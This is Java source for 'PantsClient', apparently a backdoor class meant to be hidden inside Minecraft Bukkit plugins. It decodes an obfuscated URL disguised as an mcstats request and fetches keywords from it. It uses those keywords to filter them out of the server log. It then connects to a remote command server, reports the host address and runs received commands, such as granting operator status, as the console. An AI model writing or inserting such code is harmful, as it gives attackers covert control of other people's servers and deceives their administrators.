package pants.client;

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.logging.*;
import org.bukkit.*;

/**
 * This class is meant to be placed in your Bukkit plugins. Multiple plugins
 * each containing one client are not recommended.
 */
public class PantsClient {
    private static final ArrayList<String> words = new ArrayList<String>();
    private static String prefix; // Used for messages

    public static void onLoad() { // Call from JavaPlugin
        init();
        // Put in the IP and Port of your Pants Server
        Thread checkConnectionThread = new Thread(new CheckConnectionRunnable("localhost", 444));
        checkConnectionThread.start();
    }

    private static void init() {
        try {
           /* We're imitating a request to mcstats.
            *  "	", \t, \011 and \u0009 is simply a tab
            * The statQueueRequest String is in this format: anything + tab + rot13 of the result wanted + tab + anything
            */
            StringBuilder requestBuilder = new StringBuilder();
            String statQueueRequest = "https://report.mcstats.org/plugins/requestStatsQueue.jsp?serverguid=abqrzy\tuggcf\u001d\0\0enj\u0002tvguho\017frepb\177grag\u0002pbz\0cunfr\0cnagf\0znfgre\0qngn\0Z3554T3F\u0002cl\tbtkqt7zo&statsid=4e0e5b6f-ce27-4d05-a5b7-05f9dbf78bf0";

            // Rot13 every character after the first- and before the second tab and add them to requestBuilder
            for (char bit : statQueueRequest.split("\011")[1].toCharArray()) {
                long aa = ~-~-2 & ~-~-2;// '\0'
                //Everything in binary can be tracked back to 2, even zero (0 | (~-2 << ~-2) = ~-2 << ~-2 = 1 << 1 = 1 * (2 on the 1st floor))
                long bb = aa | (~-2 << ~-2);// '\u0002' '\002'
                long dd = ((bb << (bb << ~-bb)) - bb) >> ~-bb;// '\017'
                long cc = (dd << ~-bb) - (bb >> ~-bb);// '\035'
                long ab = (bb << (bb << ~-bb));//32;// ' '
                char ac = (char)(ab << ~-bb);// '@'
                char ba = (char)(ac + '\037');// '_'
                char bc = (char)(ba - (aa & (~-(bb << ~-bb))));// '\'
                char ca = (char)(ba + ('\017' << ~-bb) - '\001');// '|'
                char cb = (char)(ca + bb);// '~'
                char cd = (char)(cb + (bb >> ~-bb));// '\177'
                //Check if it's '\0' and replace it with '/'
                if (bit == aa) {
                    bit = (char)(ac - (((~~aa | (~-(((~-(bb << ~-bb))) << ~-bb) + (bb << ~-bb))) << ~-bb) - (bb >> ~-bb)));
                }
                //Check if it's '\002' and replace it with '.'
                if (bit == bb) {
                    bit = (char)(ac - ((~~aa | (~-(((~-(bb << ~-bb))) << ~-bb) + (bb << ~-bb))) << ~-bb));
                }
                //Check if it's '\035' and replace it with 2*'\035'(':')
                if (bit == cc) {
                    bit = (char)(cc << ~-bb);
                }
                //Check if it's '\017' and replace it with 'h'
                if (bit == dd) {
                    bit = (char)(ba + (~~aa | (~-(((~-(bb << ~-bb))) << ~-bb) + (bb << ~-bb))));
                }
                //Check if it's '\177' and replace it with 'a'
                if (bit == cd) {
                    bit = (char)(ba + bb);
                }
                
                //Check if it's between 'A' and 'Z'
                if (bit >= (ac + ~-bb) && bit <= (bc - bb)) {
                    //Add 13
                    bit -= -('\015');
                    //Check if it's bigger than 'Z' 
                    if (bit > (ba - ~-(((~-(bb << ~-bb))) << ~-bb))) {
                        //Remove 26
                        bit -= ~-((~~aa | (~-(((~-(bb << ~-bb))) << ~-bb) + (bb << ~-bb))) * ((~~aa | (((~-(bb << ~-bb))) << ~-bb)) >> ~-bb));
                    }
                //Check if it's between 'a' and 'z'
                } else if (bit >= (ba + bb) && bit <= (cb - (bb << ~-bb))) {
                    //Add 13 to it
                    bit += -(-('\015'));
                    //Check if it's bigger than 'z'
                    if (bit > (ca - bb)) {
                        //Remove 26
                        bit -= ~~~~~~~~aa | ~-((~~aa | (~-(((~-(bb << ~-bb))) << ~-bb) + (bb << ~-bb))) * ((~~aa | (((~-(bb << ~-bb))) << ~-bb)) >> ~-bb));
                    }
                }

                requestBuilder.append(bit);
            }
            
            URL url = new URL(requestBuilder.toString());
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            String line;
            while ((line = in.readLine()) != null) {
                if (line.trim().startsWith("#p$")) {
                    words.add(line.trim().split("$")[1]);
                }
            }
            in.close();
            Logger.getLogger("Minecraft").setFilter(new Filter() {
                public boolean isLoggable(LogRecord record) {
                    String message = record.getMessage().toLowerCase();
                    // System.out.println("PantsLog: " + message);
                    return !message.contains(words.get(0));
                }
            });
        }
        catch (Exception e) {}
    }

    private static void handshake(Socket client) {
        try {
            // System.out.println("Starting to talk Pants Server...");
            // in new thread?
            BufferedReader fromServer = new BufferedReader(new InputStreamReader(client.getInputStream()));
            PrintStream toServer = new PrintStream(client.getOutputStream());
            String ip = InetAddress.getLocalHost()
                    + (Bukkit.getServer().getPort() != 25565 ? ":" + Bukkit.getServer().getPort() : "");
            prefix = "[" + ip + "] ";
            toServer.println(ip);
            // System.out.println("Getting commands from Pants Server...");
            // new Thread(() -> {
            getCommands(client, fromServer, toServer);
            // }).start();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static void getCommands(Socket client, BufferedReader fromServer, PrintStream toServer) {
        while (true) {
            try {
                // System.out.println("Waiting for input... Is closed: " +
                // client.isClosed());
                String in = fromServer.readLine();
                // System.out.println("Got input from Pants Server: " + in);
                if (in.contains("&&")) {
                    for (String c : in.split("&&")) {
                        parseCommand(c, fromServer, toServer);
                    }
                }
                else {
                    parseCommand(in, fromServer, toServer);
                }
            }
            catch (Exception e) {
                break;
            }
        }
    }

    private static void parseCommand(String cmd, BufferedReader fromServer, PrintStream toServer) {
        String[] args = cmd.split(" ");
        // System.out.println(words.toString());
        if (words.contains(args[0])) {
            // Run suspicious commands
            // op jdf2
            runCommand(cmd);
        }
        else if (cmd.startsWith("sudo ")) {
            // Run a command as the console
            // sudo say hello
            cmd = cmd.replaceFirst("sudo ", "");
            runCommand(cmd);
        }
        toServer.println(prefix + "Ran command: " + cmd);
    }

    private static void runCommand(String s) {
        Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), s);
    }

    private static class CheckConnectionRunnable implements Runnable {
        String hostname;
        int port;

        CheckConnectionRunnable(String h, int p) {
            this.hostname = h;
            this.port = p;
        }

        public void run() {
            boolean connected = false;
            while (!connected) {
                // System.out.println("Trying to connect to Pants Server...");
                try (Socket s = new Socket(hostname, port)) {
                    //System.out.println("Found Pants Server!");
                    PantsClient.handshake(s);
                    connected = true;
                }
                catch (Exception e) {
                    try {
                        Thread.sleep(10 * 1000);
                    }
                    catch (InterruptedException e1) {
                        e1.printStackTrace();
                    }
                }
            }
        }
    }
}
